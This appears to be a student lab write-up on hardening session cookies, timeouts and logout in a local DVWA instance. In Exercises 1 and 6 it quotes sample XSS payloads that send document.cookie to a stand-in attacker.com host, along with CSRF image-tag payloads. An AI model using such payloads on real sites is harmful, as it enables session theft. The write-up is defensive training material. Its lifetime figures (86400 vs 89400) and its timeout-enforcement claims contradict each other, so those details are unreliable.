# Secure Session Management Practices

## Overview

This lab hardened session management controls in the Damn Vulnerable Web Application (DVWA) by configuring secure cookie attributes, implementing session expiration, and testing the effectiveness of these controls against common attack vectors. The work focused on three security mechanisms: HttpOnly and SameSite cookie flags to prevent session hijacking, timeout enforcement to limit the window of opportunity for stolen sessions, and server-side session invalidation to guarantee cleanup on logout.

## Objectives

- Identify insecure session cookie configurations that enable attack vectors
- Configure HttpOnly, Secure, and SameSite cookie attributes at the application level
- Implement session timeout to automatically invalidate inactive sessions
- Create proper logout functionality that destroys server-side session data
- Test session controls by simulating expired session access attempts
- Understand the tradeoff between security and user experience in session management

## Lab Environment

- **Target Application:** DVWA (Damn Vulnerable Web Application) running on http://127.0.0.1:42001/
- **Platform:** Localhost (likely XAMPP or similar PHP stack)
- **Browser:** Firefox with Developer Tools enabled for cookie inspection
- **Testing Tools:** Multiple browser windows/incognito mode for session isolation

## Tools Used

- Browser Developer Tools (Firefox) for cookie inspection
- Text editor for modifying PHP configuration files (config.php, logout.php)
- Multiple browser instances for simulating expired session attacks

## Methodology

### Exercise 1: Auditing Current Cookie Security

I started by inspecting the DVWA session cookie to identify which security attributes were missing or misconfigured. After logging into the application, I opened the browser's Developer Tools and navigated to the Storage tab to examine the session cookie properties.

![DVWA login page](screenshots/dvwa_login.png)





![Browser Developer Tools showing insecure cookie attributes](screenshots/insecure_cookie_settings.png)



**Initial cookie configuration:**
- **HttpOnly: false** - JavaScript can access document.cookie and steal the session ID
- **Secure: false** - Cookie transmitted over unencrypted HTTP, allowing interception
- **SameSite: None** - Browser sends cookie on cross-site requests, enabling CSRF attacks

**Why each attribute matters:**

**HttpOnly flag:** When set to true, JavaScript cannot read the cookie through document.cookie. This blocks the most common XSS session hijacking technique. Without HttpOnly, an attacker who injects `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>` can steal the session ID and use it to impersonate the victim.

**Secure flag:** When set to true, the browser only sends the cookie over HTTPS connections. Without this flag, an attacker on the same network (coffee shop WiFi, compromised router) can intercept the cookie in plaintext using a packet sniffer. With HTTPS, the cookie is encrypted in transit, preventing man-in-the-middle capture.

**SameSite flag:** When set to "Strict" or "Lax", the browser refuses to send the cookie on cross-origin requests. This prevents CSRF attacks where an attacker tricks the victim into clicking a malicious link that submits a state-changing request using the victim's active session. Without SameSite protection, visiting `<img src="http://bank.com/transfer?to=attacker&amount=1000">` would execute using the victim's authenticated session.

### Exercise 2: Hardening Cookie Configuration

I modified the application's session initialization code in `config.php` to enforce secure cookie attributes. The original code did not set these flags, leaving the application vulnerable to multiple attack vectors.



![Modified config.php showing HttpOnly and SameSite enforcement](screenshots/config_php_modifications.png)



**Code changes made:**

```php
function dvwa_start_session() {
    $security_level = dvwaSecurityLevelGet();
    if ($security_level == 'impossible') {
        $httponly = true;
        $samesite = "Strict";
    }
    else {
        $httponly = true;  // Changed from false
        $samesite = "Strict";  // Changed from "None"
    }
    
    $maxlifetime = 86400;
    $secure = false;  // Cannot set to true without HTTPS
    $domain = parse_url($_SERVER['HTTP_HOST'], PHP_URL_HOST);
    
    session_set_cookie_params([
        'lifetime' => $maxlifetime,
        'path' => '/',
        'domain' => $domain,
        'secure' => $secure,
        'httponly' => $httponly,
        'samesite' => $samesite
    ]);
}
```

**Why these specific values:**

**HttpOnly set to true:** Prevents JavaScript from accessing the session cookie. An XSS payload can no longer execute `alert(document.cookie)` or send the cookie to an attacker-controlled server. The cookie remains accessible only to the PHP server code.

**SameSite set to "Strict":** The browser refuses to send the session cookie on any cross-origin request. If the user is logged into DVWA and clicks a link from evil.com that points to DVWA, the browser will not include the session cookie. The DVWA server receives the request without authentication, preventing the attack. "Strict" is more secure than "Lax" (which allows top-level navigation) but can break legitimate cross-site workflows.

**Secure remains false:** The application runs on HTTP, not HTTPS. Setting Secure to true would prevent the cookie from being sent at all, breaking the login system. Migration to HTTPS is required before enabling this flag.

**Impact on attack surface:** These changes eliminate two major attack vectors (XSS session theft and CSRF) but leave the application vulnerable to man-in-the-middle attacks due to the lack of HTTPS. This is a partial fix, not a complete solution.

### Exercise 3: Implementing Session Expiration

Session expiration limits how long a stolen session ID remains valid. Without expiration, a session ID captured months ago could still work if the user never logged out. I configured a 15-minute inactivity timeout to reduce the window of opportunity for attackers.

**How session expiration works:**

When a user logs in, the server generates a random session ID and stores it in memory or a database along with a timestamp. The server sends this ID to the browser as a cookie. Every subsequent request from the browser includes this cookie. The server checks two things:

1. Does this session ID exist in active sessions?
2. Is the time since the last request within the allowed timeout window?

If both checks pass, the server processes the request and updates the "last activity" timestamp. If the timeout has expired, the server deletes the session data and redirects to the login page.

**Configuration change:**



![Session lifetime changed from 89400 to 900 seconds](screenshots/session_lifetime_config.png)



I changed `$maxlifetime` from 89400 seconds (24.8 hours) to 900 seconds (15 minutes). This means if a user logs in and then does not interact with the application for 15 minutes, their session expires automatically.

**Critical implementation gap:** The code only sets the cookie lifetime on the client side using `session_set_cookie_params()`. This tells the browser to delete the cookie after 15 minutes, but it does not actually destroy the session data on the server. If an attacker steals the session ID before the browser deletes it, they can continue using that ID because the server still has it in active memory. Proper expiration requires checking the last activity timestamp on every request and calling `session_destroy()` when the timeout is exceeded.

### Exercise 4: Creating Proper Logout Functionality

Many applications have a "logout" button that just redirects to the login page without actually destroying the session. This leaves the session active on the server, allowing an attacker who has the session ID to continue using it even after the legitimate user thinks they have logged out.

I created `logout.php` to handle session termination properly:



![logout.php code showing proper session destruction](screenshots/logout_php_code.png)



**Code breakdown:**

```php
session_start();  // Initialize session handling
unset($_SESSION['username']);  // Clear specific session variables
session_unset();  // Clear all session variables
session_destroy();  // Delete the session from server storage
```

**Why each step matters:**

**session_start():** Before you can destroy a session, you must initialize session handling. This tells PHP to load the existing session data from the server's session store (filesystem or database) based on the session ID from the cookie.

**unset($_SESSION['username']):** Removes specific session variables. In this case, it removes the username that identifies the logged-in user. This is optional if you are calling session_unset() next.

**session_unset():** Clears all session variables in the `$_SESSION` array. This removes username, user_id, permissions, and any other application-specific data stored in the session.

**session_destroy():** Deletes the session file from the server's session storage directory. After this call, the session ID is no longer valid. If an attacker tries to use the old session ID, the server will not find any matching session data and will reject the request.

**What this prevents:** Without `session_destroy()`, logout just clears the variables but leaves the session ID active. An attacker who captured the session ID 10 minutes ago can still use it after the victim clicks logout. With proper destruction, the stolen session ID becomes useless immediately.

### Exercise 5: Testing Session Expiration Enforcement

To verify the session controls actually work, I simulated an attacker scenario where someone tries to access the application using an expired session.

**Test procedure:**

1. Logged into DVWA in Browser Window 1
2. Opened the dashboard page
3. Waited 15 minutes without interacting (session timeout threshold)
4. Copied the dashboard URL
5. Opened Browser Window 2 in incognito mode
6. Pasted the dashboard URL and pressed Enter



![Session expiration test showing redirect to login page](screenshots/session_expiration_test.png)





![Browser showing expired session cookie and login redirect](screenshots/expired_session_redirect.png)



**Result:** The application denied access and redirected to the login page. The expired session ID was not accepted, confirming that the timeout enforcement is working.

**Why this test matters:** Many applications set a session timeout value in configuration but fail to actually check it on each request. The timeout becomes a documentation-only setting with no real security value. This test proves the application is actively enforcing the 15-minute limit, not just declaring it.

**What proper enforcement looks like:** On every request, the server code should:

1. Retrieve the last activity timestamp from session storage
2. Calculate time elapsed since last activity
3. If elapsed time exceeds timeout threshold, call session_destroy() and redirect
4. If still within threshold, update last activity timestamp and process request

Without step 3, the session never expires regardless of the configured timeout value.

### Exercise 6: Evaluating Defense Effectiveness

After implementing HttpOnly, SameSite, session timeout, and proper logout, I evaluated which attacks are now prevented and which threats remain.

**Attacks now prevented:**

**XSS session hijacking:** An attacker who successfully injects JavaScript cannot steal the session cookie because HttpOnly blocks document.cookie access. The payload `<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>` returns an empty string for the session cookie.

**CSRF attacks:** The SameSite: Strict flag prevents cross-site requests from including the session cookie. An attacker who tricks the victim into visiting `<img src="http://dvwa.local/transfer.php?to=attacker&amount=1000">` will fail because the browser refuses to send the session cookie with that cross-origin request.

**Stale session exploitation:** Session timeout limits the window where a stolen session ID remains valid. If an attacker captures a session ID but waits more than 15 minutes to use it, the session expires on the server and the ID becomes worthless.

**Post-logout session reuse:** Proper logout implementation with session_destroy() invalidates the session ID immediately. An attacker who captured the session ID earlier cannot continue using it after the victim logs out.

**Remaining vulnerabilities:**

**Man-in-the-middle interception:** The Secure flag is disabled because the application runs on HTTP instead of HTTPS. An attacker on the same network can use Wireshark or tcpdump to capture the session cookie in plaintext as it travels over the wire. This is the biggest remaining weakness.

**Session fixation:** If the application does not regenerate the session ID after successful login, an attacker can force the victim to use a known session ID, then hijack the session after the victim authenticates. The lab did not address session regeneration.

**Brute force session ID guessing:** If session IDs are predictable or use weak randomness, an attacker could guess valid session IDs without ever stealing them. Modern PHP uses cryptographically secure random number generation for session IDs, but this depends on PHP version and configuration.

## Findings

**Insecure default cookie configuration enables multiple attack vectors.** DVWA's initial configuration set HttpOnly to false, Secure to false, and SameSite to None. This allows JavaScript-based session theft through XSS, network-based session interception through packet sniffing, and cross-site request forgery. All three flags must be properly configured to establish defense in depth.

**Client-side session expiration does not invalidate server-side sessions.** Setting the cookie lifetime to 900 seconds tells the browser to delete the cookie after 15 minutes, but the server continues storing the session data indefinitely. An attacker who captures the session ID within the 15-minute window can use it beyond that timeframe because the server never checks the last activity timestamp or calls session_destroy(). Proper expiration requires server-side validation on every request.

**Logout must destroy server-side session data, not just clear variables.** Calling session_unset() removes session variables from memory but leaves the session file on disk. The session ID remains valid. Only session_destroy() actually deletes the session from server storage, making the ID permanently invalid. Many applications implement fake logout that just redirects to the login page without destroying anything.

**SameSite: Strict provides strong CSRF protection but can break workflows.** Setting SameSite to "Strict" prevents all cross-origin requests from including the session cookie. This blocks CSRF attacks but also breaks legitimate scenarios like OAuth callbacks, payment gateway returns, and email-triggered password resets. Applications must choose between "Strict" (maximum security, possible breakage) and "Lax" (weaker protection, better compatibility).

**HTTPS is required for complete session protection.** Without HTTPS, the Secure flag cannot be enabled. This means session cookies travel in plaintext over the network, allowing passive eavesdropping. An attacker on coffee shop WiFi or a compromised router can capture every session ID without performing any active attack. All other session security measures are undermined if the transport layer is unencrypted.

## Challenges Faced

**Balancing security and usability with session timeout.** A 15-minute timeout provides strong security by limiting the window for stolen session exploitation, but it frustrates legitimate users who pause to read documentation, take phone calls, or step away for coffee. If the timeout is too aggressive, users spend more time re-authenticating than working. Finding the right balance requires understanding actual usage patterns. Banking applications use 5-10 minute timeouts because transactions are brief. Enterprise systems use 30-60 minute timeouts because knowledge work involves long reading and research periods.

**Understanding client-side versus server-side controls.** I initially assumed that setting the cookie lifetime to 900 seconds would automatically expire the session after 15 minutes. This is incorrect. The cookie lifetime only tells the browser when to delete the cookie. The server has no idea the cookie expired unless it actively checks the last activity timestamp on each request. The session data persists on the server indefinitely unless explicitly destroyed. This gap between client-side cookie expiration and server-side session persistence is a common implementation mistake.

**Testing session controls without access to attacker tools.** The lab asked me to verify that session expiration works, but the only tool available was a second browser window. In a real penetration test, I would use Burp Suite to capture the session cookie, wait 15 minutes, then replay a request with the expired cookie to see how the server responds. Without interception tools, I had to rely on manual timing and trust that the redirect to the login page meant the session actually expired on the server.

## Key Takeaways

**Defense in depth requires multiple cookie flags working together.** HttpOnly prevents XSS session theft, SameSite prevents CSRF, and Secure prevents network interception. Enabling only one or two flags leaves gaps. An attacker blocked by HttpOnly can switch to CSRF exploitation. An attacker blocked by SameSite can use network sniffing. All three flags must be enabled to force attackers into more expensive, detectable attack paths.

**Session timeout is a server-side enforcement problem, not a cookie problem.** The browser's cookie expiration is a convenience feature for the client, not a security control. Real timeout enforcement requires the server to check the last activity timestamp on every request and call session_destroy() when the threshold is exceeded. Never trust the client to enforce security policies.

**Logout is not cosmetic.** A logout button that just clears session variables or redirects to the login page provides no security value. Attackers who captured the session ID before logout can continue using it indefinitely. Only session_destroy() makes the session ID unusable. Every logout implementation must include server-side session deletion.

**Security controls have usability costs that must be measured.** Session expiration prevents stolen session exploitation but annoys users with forced re-authentication. SameSite: Strict prevents CSRF but breaks legitimate cross-origin workflows. The security team cannot make these tradeoff decisions in isolation. Product managers must weigh the risk of session hijacking against the cost of user frustration and abandonment.

**HTTPS is not optional for web applications.** Every other session security control becomes weaker without transport encryption. HttpOnly prevents JavaScript theft but not network interception. SameSite prevents CSRF but not passive eavesdropping. Session expiration limits the exploit window but does not prevent the initial capture. Enabling HTTPS and the Secure flag should be the first step, not the last.

**Session management controls prevent entire attack classes, not specific exploits.** XSS payloads change constantly, but HttpOnly blocks all JavaScript-based session theft regardless of the specific payload. CSRF attack variations are endless, but SameSite blocks the entire category. This makes cookie flags high-value security controls because they do not require constant updating to address new exploit techniques.

## Disclaimer

This lab was performed on a local instance of the Damn Vulnerable Web Application (DVWA), an intentionally insecure training platform designed for security education. All testing was conducted in an isolated environment with no connection to production systems. No unauthorized systems were accessed.